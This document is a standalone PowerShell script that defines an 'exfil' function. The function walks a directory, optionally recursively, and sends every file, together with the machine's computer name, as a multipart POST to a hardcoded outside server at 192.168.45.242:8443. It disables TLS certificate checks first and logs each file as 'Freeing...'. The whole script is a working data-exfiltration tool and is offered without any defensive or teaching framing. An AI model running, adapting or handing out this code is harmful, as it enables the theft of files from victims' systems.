function exfil {
    param (
        [string]$dir,
        [string]$url = 'http://192.168.45.242:8443/',
        [switch]$recurse,
        [string]$Include = '*.*',
        [string]$id 
    )
    function UploadToWebServer($filepath, $url) {
        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true } ;
        $filename = Split-Path $FilePath -Leaf
        $boundary = [System.Guid]::NewGuid().ToString()

        $TheFile = [System.IO.File]::ReadAllBytes($filePath)
        $TheFileContent = [System.Text.Encoding]::GetEncoding('iso-8859-1').GetString($TheFile)

        $id = $env:computername

        $LF = "`r`n"
        $bodyLines = (
            "--$boundary",
            "Content-Disposition: form-data; name=`"path`"$LF",
            $(Split-Path $FilePath),
            "--$boundary",
            "Content-Disposition: form-data; name=`"id`"$LF",
            $id,
            "--$boundary",
            "Content-Disposition: form-data; name=`"filename`"; filename=`"$filename`"",
            "Content-Type: application/json$LF",
            $TheFileContent,
            "--$boundary--$LF"
        ) -join $LF

        Invoke-RestMethod $url -Method POST -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body $bodyLines
    }

    if (-not(Test-Path dirs.txt)) {
        #cmd /c dir c: \ /s /b > dirs.txt
    }

    $excluded = @('*.url', '*.lnk')
    if ($recurse) {        
        $files = Get-ChildItem -Recurse -Path $dir -Filter $Include -ErrorAction SilentlyContinue -File -Exclude $excluded
        foreach ($f in $files) {
            Write-Host "Freeing... $($f.fullname)"
            UploadToWebServer -filepath $($f.FullName) -url $url
        }
    }
    else {
        $files = Get-ChildItem -Path $dir -Filter $Include -ErrorAction SilentlyContinue -File -Exclude $excluded
        foreach ($f in $files) {
            Write-Host "Freeing... $($f.fullname)"
            UploadToWebServer -filepath $($f.FullName) -url $url 
        }
    }
    if (Test-Path dirs.txt) {
        UploadToWebServer -filepath dirs.txt -url $url
    }
}
